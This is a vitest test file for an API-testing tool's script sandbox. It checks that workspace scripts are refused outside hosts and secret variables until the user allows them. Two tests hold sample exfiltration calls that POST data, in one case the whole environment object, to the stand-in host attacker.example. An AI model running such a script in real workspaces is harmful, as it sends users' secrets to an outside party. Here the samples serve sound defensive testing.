import { afterEach, describe, expect, it } from 'vitest';
import { mkdtempSync } from 'node:fs';
import { createServer } from 'node:http';
import type { AddressInfo } from 'node:net';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { VariableScope, WorkspaceStore, allowScripts, runScript, scriptRequestSender, scriptScopes, scriptTrustFor, type ScriptTrust } from '../../packages/core/src/index.js';

const ws = () => WorkspaceStore.create(mkdtempSync(join(tmpdir(), 'tp-strust-')), 'w');

const savedEnv = process.env.TESTPION_TRUST_SCRIPTS;
afterEach(() => {
  if (savedEnv === undefined) delete process.env.TESTPION_TRUST_SCRIPTS;
  else process.env.TESTPION_TRUST_SCRIPTS = savedEnv;
});

// a workspace's scripts come with the workspace: they get no secrets and no outside hosts until the person says so
describe('scripts: hosts and secrets need the workspace to be allowed', () => {
  it('tp.sendRequest to an unknown host is refused, names the host and sends nothing; after the allow it sends', async () => {
    delete process.env.TESTPION_TRUST_SCRIPTS;
    const store = ws();
    let hits = 0;
    const srv = createServer((_q, r) => {
      hits++;
      r.end('ok');
    });
    await new Promise<void>((res) => srv.listen(0, '127.0.0.1', res));
    const port = (srv.address() as AddressInfo).port;
    try {
      const blocked: string[] = [];
      const trust = scriptTrustFor(store, { onBlocked: (b) => blocked.push(b.kind === 'host' ? b.host : 'secrets') });
      const send = scriptRequestSender({ production: undefined, trust });
      // another host: refused before anything is sent
      await expect(send({ method: 'POST', url: 'http://attacker.example/x', headers: [], body: 'secret' })).rejects.toThrow(/attacker\.example is not allowed/);
      expect(blocked).toEqual(['attacker.example']);
      // loopback and the request's own host need no decision
      expect((await send({ method: 'GET', url: `http://127.0.0.1:${port}/`, headers: [] })).status).toBe(200);
      const own = scriptRequestSender({ production: undefined, trust: scriptTrustFor(store), ownHost: () => 'api.example.test' });
      await expect(own({ method: 'GET', url: 'http://other.example.test/', headers: [] })).rejects.toThrow(/not allowed/);
      expect(hits).toBe(1);
      // the person allows the host: it is allowed for this workspace only
      allowScripts(store, { host: 'attacker.example' });
      expect(scriptTrustFor(store).hostAllowed('attacker.example')).toBe(true);
      expect(scriptTrustFor(ws()).hostAllowed('attacker.example')).toBe(false);
    } finally {
      srv.close();
    }
  });

  it('through a script: the refusal reaches tp.sendRequest as an error', async () => {
    delete process.env.TESTPION_TRUST_SCRIPTS;
    const trust = scriptTrustFor(ws());
    const out = await runScript(`tp.sendRequest({ url: 'http://attacker.example/x', method: 'POST', body: JSON.stringify(tp.environment.toObject()) }, (err) => { tp.variables.set('err', String(err)); });`, { variables: {}, environment: {} } as never, {
      sendRequest: scriptRequestSender({ production: undefined, trust }),
    });
    expect(String(out.vars.err ?? out.error)).toMatch(/not allowed/);
  });

  it('secrets are hidden from scripts until the workspace is allowed to read them', () => {
    delete process.env.TESTPION_TRUST_SCRIPTS;
    const store = ws();
    const vars = new VariableScope();
    vars.setScope('environment', [
      { key: 'baseUrl', value: 'https://api.example.com' },
      { key: 'apiKey', value: 'sk-very-secret', secret: true },
    ]);
    const told: string[][] = [];
    const trust = scriptTrustFor(store, { onBlocked: (b) => b.kind === 'secrets' && told.push(b.keys) });
    const seen = scriptScopes(vars, undefined, trust);
    expect(seen.environment).toEqual({ baseUrl: 'https://api.example.com' });
    expect(seen.variables).toEqual({ baseUrl: 'https://api.example.com' });
    expect(told).toEqual([['apiKey']]);
    // requests still resolve them on the host
    expect(vars.resolve('{{apiKey}}')).toBe('sk-very-secret');
    allowScripts(store, { secrets: true });
    expect(scriptScopes(vars, undefined, scriptTrustFor(store)).environment).toEqual({ baseUrl: 'https://api.example.com', apiKey: 'sk-very-secret' });
  });

  it('--trust-scripts / TESTPION_TRUST_SCRIPTS=1 lifts the gate for headless runs; no gate at all is unrestricted', () => {
    const store = ws();
    process.env.TESTPION_TRUST_SCRIPTS = '1';
    const t: ScriptTrust = scriptTrustFor(store);
    expect(t.hostAllowed('anything.example')).toBe(true);
    expect(t.secretsAllowed()).toBe(true);
    delete process.env.TESTPION_TRUST_SCRIPTS;
    expect(scriptTrustFor(store).hostAllowed('anything.example')).toBe(false);
    expect(scriptTrustFor(store, { all: true }).secretsAllowed()).toBe(true);
    allowScripts(store, { host: '*' });
    expect(scriptTrustFor(store).hostAllowed('anything.example')).toBe(true);
  });
});
